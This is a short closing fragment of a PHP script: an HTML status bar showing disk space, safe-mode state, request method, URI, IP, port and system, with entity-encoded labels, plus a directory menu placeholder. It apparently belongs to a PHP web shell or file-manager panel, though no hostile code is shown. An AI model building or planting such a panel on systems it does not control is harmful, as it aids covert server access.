&nbsp;&nbsp;<span><b>&#83;&#112;&#97;&#99;&#101;&#58;</b>&nbsp;<progress max="$dts" value="$total" title="$v_spc von $t_spc" >GB</progress></span>&nbsp;&nbsp;|&nbsp;&nbsp;<span>&#83;&#45;&#77;&#111;&#100;&#58;&nbsp;<u>$s_i</u></span>&nbsp;&nbsp;|&nbsp;&nbsp;<span>&#77;&#101;&#116;&#104;&#58;&nbsp;<u>$m_i</u></span>&nbsp;&nbsp;|&nbsp;&nbsp;<span>&#85;&#82;&#73;&#58;&nbsp;<u><a href="http://$u_i" target="_blank">$u_i</a></u></span>&nbsp;&nbsp;|&nbsp;&nbsp;<span>&#73;&#112;&#58;&nbsp;<u><a href="http://$i_i" target="_blank">$i_i</a></u></span>&nbsp;&nbsp;|&nbsp;&nbsp;<span>&#80;&#111;&#114;&#116;&#58;&nbsp;<u>$po_i</u></span>&nbsp;&nbsp;|&nbsp;&nbsp;<span>B-&#83;&#121;&#115;&#58;&nbsp;<u>$bs_i</u></span>&nbsp;&nbsp;|&nbsp;&nbsp;<span>&#83;&#121;&#115;&#58;&nbsp;<u>$s_i</u></span>
</div>
$verz_menue
</form></body></html>
APS_HTML;

print($supp&&!empty($sturl)?$APS_CSS."\n\n".$APS_HTML:die($die));
?>
